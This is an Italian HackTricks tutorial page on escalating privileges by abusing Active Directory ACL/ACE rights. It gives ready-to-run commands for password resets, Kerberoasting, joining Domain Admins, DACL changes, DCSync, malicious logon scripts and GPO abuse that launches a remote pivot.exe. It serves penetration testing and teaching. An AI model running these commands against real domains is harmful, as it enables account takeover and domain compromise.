# Abuso di ACL/ACE di Active Directory

<details>

<summary><strong>Impara l'hacking AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

**Questa pagina è principalmente un riassunto delle tecniche da** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Per ulteriori dettagli, controlla gli articoli originali.**

## **Diritti GenericAll sull'Utente**

Questo privilegio concede a un attaccante il pieno controllo su un account utente di destinazione. Una volta confermati i diritti `GenericAll` utilizzando il comando `Get-ObjectAcl`, un attaccante può:

* **Cambiare la Password del Target**: Utilizzando `net user <username> <password> /domain`, l'attaccante può reimpostare la password dell'utente.
* **Kerberoasting Mirato**: Assegnare un SPN all'account dell'utente per renderlo kerberoastable, quindi utilizzare Rubeus e targetedKerberoast.py per estrarre e tentare di craccare gli hash del ticket-granting ticket (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **ASREPRoasting mirato**: Disabilita la pre-autenticazione per l'utente, rendendo il loro account vulnerabile all'ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Diritti GenericAll sul Gruppo**

Questo privilegio consente a un attaccante di manipolare l'appartenenza ai gruppi se ha i diritti `GenericAll` su un gruppo come `Domain Admins`. Dopo aver identificato il nome distintivo del gruppo con `Get-NetGroup`, l'attaccante può:

* **Aggiungersi al Gruppo Domain Admins**: Questo può essere fatto tramite comandi diretti o utilizzando moduli come Active Directory o PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write su Computer/Utente**

Possedere questi privilegi su un oggetto computer o un account utente consente:

- **Delega vincolata basata su risorse Kerberos**: Consente di assumere il controllo di un oggetto computer.
- **Credenziali ombra**: Utilizzare questa tecnica per impersonare un computer o un account utente sfruttando i privilegi per creare credenziali ombra.

## **WriteProperty su Gruppo**

Se un utente ha diritti di `WriteProperty` su tutti gli oggetti per un gruppo specifico (ad esempio, `Domain Admins`), possono:

- **Aggiungersi al Gruppo Domain Admins**: Ottenibile combinando i comandi `net user` e `Add-NetGroupUser`, questo metodo consente l'escalation dei privilegi all'interno del dominio.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Autoaggiunta (Autoappartenenza) al Gruppo**

Questo privilegio consente agli attaccanti di aggiungersi a gruppi specifici, come `Domain Admins`, tramite comandi che manipolano direttamente l'appartenenza al gruppo. Utilizzando la seguente sequenza di comandi è possibile aggiungersi automaticamente:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Auto-iscrizione)**

Un privilegio simile, questo consente agli attaccanti di aggiungersi direttamente ai gruppi modificando le proprietà dei gruppi se hanno il diritto di `WriteProperty` su quei gruppi. La conferma e l'esecuzione di questo privilegio vengono eseguite con:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Detenere l'`ExtendedRight` su un utente per `User-Force-Change-Password` consente di reimpostare le password senza conoscere quella attuale. La verifica di questo diritto e la sua sfruttamento possono essere effettuati tramite PowerShell o strumenti da riga di comando alternativi, offrendo diversi metodi per reimpostare la password di un utente, inclusi sessioni interattive e comandi in una riga per ambienti non interattivi. I comandi vanno dalle semplici invocazioni di PowerShell all'uso di `rpcclient` su Linux, dimostrando la versatilità dei vettori di attacco.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner su Gruppo**

Se un attaccante scopre di avere i diritti `WriteOwner` su un gruppo, può cambiare la proprietà del gruppo a se stesso. Questo è particolarmente impattante quando il gruppo in questione è `Domain Admins`, poiché cambiare la proprietà consente un controllo più ampio sugli attributi e l'appartenenza al gruppo. Il processo coinvolge l'individuazione dell'oggetto corretto tramite `Get-ObjectAcl` e quindi l'utilizzo di `Set-DomainObjectOwner` per modificare il proprietario, sia tramite SID che nome.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite su User**

Questa autorizzazione consente a un attaccante di modificare le proprietà dell'utente. In particolare, con l'accesso a `GenericWrite`, l'attaccante può modificare il percorso dello script di accesso di un utente per eseguire uno script dannoso all'avvio dell'utente. Ciò viene realizzato utilizzando il comando `Set-ADObject` per aggiornare la proprietà `scriptpath` dell'utente di destinazione in modo che punti allo script dell'attaccante.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite su Gruppo**

Con questo privilegio, gli attaccanti possono manipolare l'appartenenza a gruppi, ad esempio aggiungendo se stessi o altri utenti a gruppi specifici. Questo processo comporta la creazione di un oggetto di credenziali, utilizzandolo per aggiungere o rimuovere utenti da un gruppo e verificare le modifiche di appartenenza con comandi PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Possedere un oggetto AD e avere i privilegi `WriteDACL` su di esso consente a un attaccante di concedersi i privilegi `GenericAll` sull'oggetto. Questo viene realizzato attraverso la manipolazione di ADSI, consentendo il pieno controllo sull'oggetto e la capacità di modificare le sue appartenenze ai gruppi. Tuttavia, esistono limitazioni nel tentativo di sfruttare questi privilegi utilizzando i cmdlet `Set-Acl` / `Get-Acl` del modulo Active Directory.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replicazione nel Dominio (DCSync)**

L'attacco DCSync sfrutta specifici permessi di replica nel dominio per imitare un Domain Controller e sincronizzare i dati, inclusa le credenziali utente. Questa potente tecnica richiede permessi come `DS-Replication-Get-Changes`, consentendo agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Per saperne di più sull'attacco DCSync clicca qui.**](../dcsync.md)

## Delega GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delega GPO

L'accesso delegato per gestire gli Oggetti delle Policy di Gruppo (GPO) può presentare significativi rischi per la sicurezza. Ad esempio, se a un utente come `offense\spotless` vengono delegati i diritti di gestione GPO, potrebbe avere privilegi come **WriteProperty**, **WriteDacl**, e **WriteOwner**. Questi permessi possono essere abusati per scopi maliziosi, come identificato utilizzando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerare i Permessi GPO

Per identificare GPO mal configurati, i cmdlet di PowerSploit possono essere concatenati insieme. Ciò consente di scoprire i GPO che un utente specifico ha i permessi per gestire: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer con una Determinata Policy Applicata**: È possibile determinare a quali computer si applica un GPO specifico, aiutando a comprendere l'entità dell'impatto potenziale. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policy Applicate a un Determinato Computer**: Per vedere quali policy sono applicate a un computer specifico, possono essere utilizzati comandi come `Get-DomainGPO`.

**OU con una Determinata Policy Applicata**: Identificare le unità organizzative (OU) interessate da una determinata policy può essere fatto utilizzando `Get-DomainOU`.

### Abuso GPO - New-GPOImmediateTask

I GPO mal configurati possono essere sfruttati per eseguire codice, ad esempio, creando un'attività pianificata immediata. Questo può essere fatto per aggiungere un utente al gruppo degli amministratori locali sui computer interessati, elevando significativamente i privilegi:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Modulo GroupPolicy - Abuso di GPO

Il modulo GroupPolicy, se installato, consente la creazione e il collegamento di nuovi GPO e l'impostazione delle preferenze come i valori del registro per eseguire backdoor sui computer interessati. Questo metodo richiede che il GPO venga aggiornato e che un utente effettui l'accesso al computer per l'esecuzione:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuso di GPO

SharpGPOAbuse offre un metodo per abusare delle GPO esistenti aggiungendo attività o modificando impostazioni senza la necessità di creare nuove GPO. Questo strumento richiede la modifica delle GPO esistenti o l'uso di strumenti RSAT per crearne di nuove prima di applicare le modifiche:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzare l'Aggiornamento della Policy

Di solito gli aggiornamenti delle GPO avvengono circa ogni 90 minuti. Per accelerare questo processo, specialmente dopo aver implementato un cambiamento, il comando `gpupdate /force` può essere utilizzato sul computer di destinazione per forzare un immediato aggiornamento della policy. Questo comando garantisce che le modifiche alle GPO siano applicate senza dover attendere il ciclo di aggiornamento automatico successivo.

### Sotto il Cofano

Dopo aver ispezionato i Compiti Pianificati per una determinata GPO, come la `Policy Malconfigurata`, l'aggiunta di compiti come `evilTask` può essere confermata. Questi compiti sono creati tramite script o strumenti a riga di comando che mirano a modificare il comportamento del sistema o ad escalare i privilegi.

La struttura del compito, come mostrato nel file di configurazione XML generato da `New-GPOImmediateTask`, descrive i dettagli del compito pianificato - inclusi il comando da eseguire e i suoi trigger. Questo file rappresenta come i compiti pianificati sono definiti e gestiti all'interno delle GPO, fornendo un metodo per eseguire comandi o script arbitrari come parte dell'applicazione delle policy.

### Utenti e Gruppi

Le GPO consentono anche la manipolazione delle appartenenze degli utenti e dei gruppi nei sistemi di destinazione. Modificando direttamente i file di policy degli Utenti e dei Gruppi, gli attaccanti possono aggiungere utenti a gruppi privilegiati, come il gruppo `amministratori` locale. Questo è possibile attraverso la delega dei permessi di gestione delle GPO, che permette la modifica dei file di policy per includere nuovi utenti o cambiare le appartenenze ai gruppi.

Il file di configurazione XML per Utenti e Gruppi descrive come queste modifiche vengono implementate. Aggiungendo voci a questo file, specifici utenti possono ottenere privilegi elevati su tutti i sistemi interessati. Questo metodo offre un approccio diretto all'escalation dei privilegi attraverso la manipolazione delle GPO.

Inoltre, possono essere considerati anche metodi aggiuntivi per eseguire codice o mantenere la persistenza, come sfruttare script di accesso/uscita, modificare le chiavi di registro per gli autorun, installare software tramite file .msi o modificare le configurazioni dei servizi. Queste tecniche offrono varie vie per mantenere l'accesso e controllare i sistemi di destinazione attraverso l'abuso delle GPO.

## Riferimenti

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)
